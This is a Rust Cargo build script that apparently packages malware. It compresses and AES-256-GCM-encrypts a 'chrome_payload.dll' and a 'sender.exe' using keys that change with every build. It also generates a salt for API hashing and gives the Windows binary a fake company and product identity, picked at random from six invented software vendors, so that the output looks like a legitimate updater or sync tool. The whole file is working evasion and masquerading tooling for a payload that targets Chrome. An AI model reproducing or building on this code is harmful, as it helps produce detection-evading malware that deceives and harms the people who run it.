use std::{env, fs, path::PathBuf};
use flate2::write::DeflateEncoder;
use flate2::Compression;
use std::io::Write;

fn aes256gcm_encrypt(plaintext: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
    use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};
    let cipher = Aes256Gcm::new_from_slice(key).unwrap();
    let n = Nonce::from_slice(nonce);
    cipher.encrypt(n, plaintext).expect("aes encrypt payload")
}

fn rand_key_from_seed(seed: u64) -> [u8; 32] {
    let mut key = [0u8; 32];
    let mut x = seed ^ 0xDEAD_BEEF_CAFE_F00D;
    for b in key.iter_mut() {
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        *b = (x & 0xFF) as u8;
    }
    key
}

fn rand_nonce_from_seed(seed: u64) -> [u8; 12] {
    let mut nonce = [0u8; 12];
    let mut x = seed ^ 0xFEEDFACE_CAFEBABE;
    for b in nonce.iter_mut() {
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        *b = (x & 0xFF) as u8;
    }
    nonce
}

fn time_seed() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0x13374242DEADBEEF)
        ^ (std::process::id() as u64).wrapping_mul(0x9E3779B97F4A7C15)
}

fn obfuscate_aes(dll_bytes: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
    let mut encoder = DeflateEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(dll_bytes).expect("compress payload");
    let compressed = encoder.finish().expect("finish compression");
    aes256gcm_encrypt(&compressed, key, nonce)
}

fn gen_hash_salt(seed: u64, out_dir: &PathBuf) {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};

    let mut h = DefaultHasher::new();
    seed.hash(&mut h);
    env::var("CARGO_PKG_VERSION").unwrap_or_default().hash(&mut h);
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
        .hash(&mut h);
    let salt = h.finish() as u32;

    let salt_path = out_dir.join("api_hash_salt.rs");
    fs::write(
        &salt_path,
        format!("pub const HASH_SALT: u32 = 0x{:08X};\n", salt),
    )
    .expect("write api_hash_salt.rs");
}

fn main() {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let out_dir = PathBuf::from(env::var("OUT_DIR").expect("OUT_DIR not set"));

    // Must be emitted every run so Cargo tracks env changes between build passes.
    println!("cargo:rerun-if-env-changed=SENDER_EXE");
    println!("cargo:rerun-if-env-changed=SKIP_SENDER_EMBED");
    println!("cargo:rerun-if-env-changed=SENDER_EMBED_PASS");
    println!("cargo:rerun-if-env-changed=CHROME_PAYLOAD_DLL");

    // Embed Windows resources — fake app identity, polymorphic per build.
    // All details are invented; the app and company do not exist.
    // The profile is selected pseudo-randomly from the seed so it changes
    // every build while remaining internally consistent.
    let seed_lo = time_seed() & 0xFFFF;
    let profile_idx = (seed_lo % 6) as usize;

    let profiles: &[(&str, &str, &str, &str, &str)] = &[
        // (company, product, description, exe_name, version)
        (
            "Nexlify Technologies Ltd.",
            "Nexlify Sync",
            "Nexlify Cloud Synchronization Service",
            "NexlifySync.exe",
            "3.1.4.8",
        ),
        (
            "Vortex Software Group",
            "VortexAssist",
            "VortexAssist System Helper",
            "VortexAssist.exe",
            "2.7.0.14",
        ),
        (
            "Lumaris Digital Solutions",
            "Lumaris Connect",
            "Lumaris Connect Background Service",
            "LumarisConnect.exe",
            "1.9.3.22",
        ),
        (
            "Dravex Systems Inc.",
            "Dravex Optimizer",
            "Dravex System Optimizer",
            "DravexOpt.exe",
            "4.0.2.5",
        ),
        (
            "Calvera Software GmbH",
            "CalveraSync",
            "CalveraSync File Synchronization",
            "CalveraSync.exe",
            "2.3.7.11",
        ),
        (
            "Syntherion Labs",
            "Syntherion Updater",
            "Syntherion Application Update Manager",
            "SyntherionUpdater.exe",
            "1.5.1.3",
        ),
    ];

    let (company, product, description, exe_name, version) = profiles[profile_idx];
    let copyright = format!("\u{00a9} {} All rights reserved.", company);

    let mut res = winresource::WindowsResource::new();
    res.set("CompanyName",      company);
    res.set("FileDescription",  description);
    res.set("FileVersion",      version);
    res.set("InternalName",     exe_name);
    res.set("OriginalFilename", exe_name);
    res.set("ProductName",      product);
    res.set("ProductVersion",   version);
    res.set("LegalCopyright",   &copyright);
    res.set_language(0x0409);
    res.compile().expect("Failed to compile resources");

    // Per-build random AES key + nonce for payload embedding
    let seed = time_seed();
    let aes_key   = rand_key_from_seed(seed);
    let aes_nonce = rand_nonce_from_seed(seed.wrapping_add(0xCAFEBABEDEADBEEF));

    // Generate per-build API hash salt
    gen_hash_salt(seed, &out_dir);

    // Write AES key and nonce as binary files for ci.rs to include
    let key_path   = out_dir.join("payload_key.bin");
    let nonce_path = out_dir.join("payload_nonce.bin");
    fs::write(&key_path,   &aes_key).expect("write payload_key.bin");
    fs::write(&nonce_path, &aes_nonce).expect("write payload_nonce.bin");

    // Find the payload DLL — check cross-compile output dir first, then native
    let candidates = [
        env::var("CHROME_PAYLOAD_DLL").ok().map(PathBuf::from),
        Some(manifest_dir.join("target/x86_64-pc-windows-gnu/release/chrome_payload.dll")),
        Some(manifest_dir.join("target/release/chrome_payload.dll")),
        Some(manifest_dir.join("src/payload/target/release/chrome_payload.dll")),
        env::var("CARGO_TARGET_DIR")
            .ok()
            .map(|d| PathBuf::from(d).join("release/chrome_payload.dll")),
    ];

    let dll_path = candidates
        .into_iter()
        .flatten()
        .find(|p| p.exists() && p.metadata().map(|m| m.len()).unwrap_or(0) > 0)
        .expect("chrome_payload.dll not found");

    let dll_bytes  = fs::read(&dll_path).expect("read payload DLL");
    let obfuscated = obfuscate_aes(&dll_bytes, &aes_key, &aes_nonce);

    let out_path = out_dir.join("payload_obf.bin");
    fs::write(&out_path, &obfuscated).expect("write obfuscated payload");

    // Embed sender.exe (built before main) with a distinct per-build key
    let sender_seed = seed.wrapping_add(0x5EED_5EED_5EED_5EED);
    let sender_key   = rand_key_from_seed(sender_seed);
    let sender_nonce = rand_nonce_from_seed(sender_seed.wrapping_add(0xBEEFCAFE1234));

    let sender_key_path   = out_dir.join("sender_key.bin");
    let sender_nonce_path = out_dir.join("sender_nonce.bin");
    fs::write(&sender_key_path,   &sender_key).expect("write sender_key.bin");
    fs::write(&sender_nonce_path, &sender_nonce).expect("write sender_nonce.bin");

    let sender_candidates = [
        env::var("SENDER_EXE").ok().map(PathBuf::from),
        Some(manifest_dir.join("target/release/sender.exe")),
        Some(manifest_dir.join("target/x86_64-pc-windows-gnu/release/sender.exe")),
        env::var("CARGO_TARGET_DIR")
            .ok()
            .map(|d| PathBuf::from(d).join("release/sender.exe")),
    ];

    let skip_sender_embed = env::var("SKIP_SENDER_EMBED").is_ok();

    let sender_obf = if skip_sender_embed {
        println!("cargo:warning=sender embed skipped (sender build pass)");
        Vec::new()
    } else if let Some(sender_path) = sender_candidates
        .iter()
        .flatten()
        .find(|p| p.exists() && p.metadata().map(|m| m.len()).unwrap_or(0) > 0)
    {
        let sender_bytes = fs::read(sender_path).expect("read sender.exe");
        let obf = obfuscate_aes(&sender_bytes, &sender_key, &sender_nonce);
        println!(
            "cargo:warning=embedded sender (deflate+AES-256-GCM) from {} ({} -> {} bytes)",
            sender_path.display(),
            sender_bytes.len(),
            obf.len(),
        );
        println!("cargo:rerun-if-changed={}", sender_path.display());
        obf
    } else {
        let checked: Vec<String> = sender_candidates
            .iter()
            .flatten()
            .map(|p| format!("{} exists={}", p.display(), p.exists()))
            .collect();
        println!(
            "cargo:warning=sender.exe not found — embedded sender disabled (inline fallback); checked: {}",
            checked.join("; ")
        );
        Vec::new()
    };

    let sender_out = out_dir.join("sender_obf.bin");
    fs::write(&sender_out, &sender_obf).expect("write obfuscated sender");

    if let Ok(prefix) = env::var("COMPILE_PREFIX") {
        println!("cargo:rustc-env=COMPILE_PREFIX={}", prefix);
    }
    if let Ok(suffix) = env::var("COMPILE_SUFFIX") {
        println!("cargo:rustc-env=COMPILE_SUFFIX={}", suffix);
    }

    println!("cargo:rerun-if-changed={}", dll_path.display());
    println!(
        "cargo:warning=embedded payload (deflate+AES-256-GCM) from {} ({} -> {} bytes)",
        dll_path.display(),
        dll_bytes.len(),
        obfuscated.len(),
    );
}
